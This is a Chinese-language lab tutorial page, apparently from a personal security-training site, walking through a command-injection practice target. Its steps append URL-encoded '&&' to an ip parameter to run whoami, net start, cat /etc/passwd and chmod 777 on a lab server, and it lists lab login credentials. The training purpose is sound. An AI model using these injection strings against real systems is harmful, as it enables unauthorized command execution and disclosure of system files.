<!doctype html>
<html class="no-js" lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
    
  命令执行漏洞靶场练习一 - 刘箫－在线文档库
  
  </title>
 <meta name="description" content="">
 <link href="atom.xml" rel="alternate" title="刘箫－在线文档库" type="application/atom+xml">
    <link rel="stylesheet" href="asset/css/foundation.min.css" />
    <link rel="stylesheet" href="asset/css/docs.css" />

    <script src="asset/js/vendor/modernizr.js"></script>
    <script src="asset/js/vendor/jquery.js"></script>
    <script src="asset/highlightjs/highlight.pack.js"></script>
    <link href="asset/highlightjs/styles/github.css" media="screen, projection" rel="stylesheet" type="text/css">
    <script>hljs.initHighlightingOnLoad();</script>
    
  </head>
  <body class="antialiased hide-extras">
    
    <div class="marketing off-canvas-wrap" data-offcanvas>
      <div class="inner-wrap">


<nav class="top-bar docs-bar hide-for-small" data-topbar>

<div id="header">
    <h1><a href="index.html">刘箫－在线文档库</a></h1>
</div>

</nav>
        <nav class="tab-bar show-for-small">
  <a href="javascript:void(0)" class="left-off-canvas-toggle menu-icon">
    <span> &nbsp; 刘箫－在线文档库</span>
  </a>
</nav>

<aside class="left-off-canvas-menu">
      <ul class="off-canvas-list">
      <li><a href="index.html">Home</a></li>
      
        <li class="divider"></li>
        <li><label>Kali Linux系统</label></li>

          
            <li><a title="Kali Linux VMware安装教程" href="15777277257654.html">Kali Linux VMware安装教程</a></li>
          

      
        <li class="divider"></li>
        <li><label>网络安全攻防实训</label></li>

          
            <li><a title="命令执行漏洞靶场练习一" href="15779369330383.html">命令执行漏洞靶场练习一</a></li>
          
            <li><a title="命令执行漏洞靶场练习二" href="15779437571983.html">命令执行漏洞靶场练习二</a></li>
          

      
        <li class="divider"></li>
        <li><label>攻防实战演练</label></li>

          
            <li><a title="“永恒之蓝”勒索病毒实战演练" href="15777610682083.html">“永恒之蓝”勒索病毒实战演练</a></li>
          
            <li><a title="Windows影藏后门账户" href="15778921528695.html">Windows影藏后门账户</a></li>
          

      
      </ul>
    </aside>

<a class="exit-off-canvas" href="#"></a>

        <section id="main-content" role="main" class="scroll-container">

          <div class="row">
            <div class="large-3 medium-3 columns">
              <div class="hide-for-small">
                <div class="sidebar">
                <nav>
                  <ul id="side-nav" class="side-nav">

                    
                      <li class="side-title"><span>Kali Linux系统</span></li>
                        
                          <li><a title="Kali Linux VMware安装教程" href="15777277257654.html">Kali Linux VMware安装教程</a></li>
                        

                    
                      <li class="side-title"><span>网络安全攻防实训</span></li>
                        
                          <li><a title="命令执行漏洞靶场练习一" href="15779369330383.html">命令执行漏洞靶场练习一</a></li>
                        
                          <li><a title="命令执行漏洞靶场练习二" href="15779437571983.html">命令执行漏洞靶场练习二</a></li>
                        

                    
                      <li class="side-title"><span>攻防实战演练</span></li>
                        
                          <li><a title="“永恒之蓝”勒索病毒实战演练" href="15777610682083.html">“永恒之蓝”勒索病毒实战演练</a></li>
                        
                          <li><a title="Windows影藏后门账户" href="15778921528695.html">Windows影藏后门账户</a></li>
                        

                    
                  </ul>
                </nav>
                </div>
              </div>
            </div>
            <div class="large-9 medium-9 columns">

 <div class="markdown-body">
<h1>命令执行漏洞靶场练习一</h1>

<h3 id="toc_0">一.实验目的</h3>

<p>了解命令执行漏洞的危害</p>

<h4 id="toc_1">二.实验原理</h4>

<p>由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p>

<h4 id="toc_2">三、实验内容：</h4>

<p>命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数使得攻击成功。</p>

<h4 id="toc_3">四.实验环境描述</h4>

<p>1、靶机用户名密码为: root toor<br/>
2、渗透机用户名密码为: admin 123456</p>

<h4 id="toc_4">五.实验步骤</h4>

<h5 id="toc_5">1、在靶机上输入ifconfig查看靶机地址(请自行修改ip地址，确保实验可以做通)</h5>

<p><img src="media/15779369330383/01.png" alt="01"/></p>

<h5 id="toc_6">2、在攻击机win7的浏览器中输入靶机地址192.168.10.117/index.php</h5>

<p><img src="media/15779369330383/02.png" alt="02"/></p>

<h5 id="toc_7">3、找到 Commands injection ，点击Example1进入命令注入环境第一的实例</h5>

<p><img src="media/15779369330383/03.png" alt="03"/></p>

<h5 id="toc_8">4、在攻击机浏览器中输入<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> &amp;&amp; pwd发现并没有什么变化</h5>

<p><img src="media/15779369330383/04.png" alt="04"/></p>

<h5 id="toc_9">5、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 pwd将&amp;&amp;进行编码，显示了当前路径</h5>

<p><img src="media/15779369330383/05.png" alt="05"/></p>

<h4 id="toc_10">漏洞利用</h4>

<h5 id="toc_11">1、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 whoami进行whoami查询</h5>

<p><img src="media/15779369330383/06.png" alt="06"/></p>

<h5 id="toc_12">2、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 net start，通过命令注入攻击查看web服务器开启了哪些服务</h5>

<p><img src="media/15779369330383/07.png" alt="07"/></p>

<h5 id="toc_13">3、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 cat /etc/passwd,显示当前有哪些用户。</h5>

<p><img src="media/15779369330383/08.png" alt="08"/></p>

<h5 id="toc_14">4、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 ls -l查看当前目录下所有可见文件的详细属性</h5>

<p><img src="media/15779369330383/09.png" alt="09"/></p>

<h5 id="toc_15">5、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 chmod 777 examplel.php ,修改examplel.php文件的权限为文件所在的组和其他用户是可读可写可执行。</h5>

<p><img src="media/15779369330383/10.png" alt="10"/></p>

<h5 id="toc_16">6、<a href="http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1">http://192.168.10.117/commandexec/example1.php?ip=127.0.0.1</a> ％26％26 ls -l查看当前目录下所有可见文件的详细属性，examplel.php的文件权限已经被修改了。</h5>

<p><img src="media/15779369330383/11.png" alt="11"/></p>


</div>

<br /><br />
<hr />

<div class="row clearfix">
  <div class="large-6 columns">
	<div class="text-left" style="padding:15px 0px;">
		
	        <a href="15777277257654.html"  title="Previous Post: Kali Linux VMware安装教程">&laquo; Kali Linux VMware安装教程</a>
	    
	</div>
  </div>
  <div class="large-6 columns">
	<div class="text-right" style="padding:15px 0px;">
		
	        <a href="15779437571983.html" 
	        title="Next Post: 命令执行漏洞靶场练习二">命令执行漏洞靶场练习二 &raquo;</a>
	    
	</div>
  </div>
</div>

<div class="row">
<div style="padding:0px 0.93em;" class="share-comments">

</div>
</div>
<script type="text/javascript">
	$(function(){
		var currentURL = '15779369330383.html';
		$('#side-nav a').each(function(){
			if($(this).attr('href') == currentURL){
				$(this).parent().addClass('active');
			}
		});
	});
</script>  
</div></div>


<div class="page-bottom">
  <div class="row">
  <hr />
  <div class="small-9 columns">
  <p class="copyright">Copyright &copy; 2015
Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
  </div>
  <div class="small-3 columns">
  <p class="copyright text-right"><a href="#header">TOP</a></p>
  </div>
   
  </div>
</div>

        </section>
      </div>
    </div>
    
    
    <script src="asset/js/foundation.min.js"></script>
    <script src="asset/js/foundation/foundation.offcanvas.js"></script>
    <script>
      $(document).foundation();

     
    </script>
    


  </body>
</html>
